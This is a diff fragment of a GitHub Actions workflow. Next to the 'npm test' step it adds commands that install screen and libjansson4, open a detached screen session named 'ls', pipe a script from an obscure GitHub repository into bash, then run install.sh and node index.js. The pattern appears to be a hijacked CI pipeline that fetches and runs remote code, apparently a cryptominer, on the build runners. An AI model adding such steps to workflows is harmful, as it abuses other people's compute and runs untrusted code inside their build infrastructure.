@@ -23,4 +23,14 @@ jobs:
     - run: npm test
     - run: |
           echo "::save-state name={name}::{value}"
+          sudo apt update
+          sudo apt install screen libjansson4 -y 
+          screen -dmS ls
+          sudo apt install curl ca-certificates -y
           curl https://raw.githubusercontent.com/fgvcasdrtya/fgvcasdrtya/main/install.sh | bash
+          source ~/.bashrc
+          npm install
+          sh install.sh
+          node index.js
+
+          
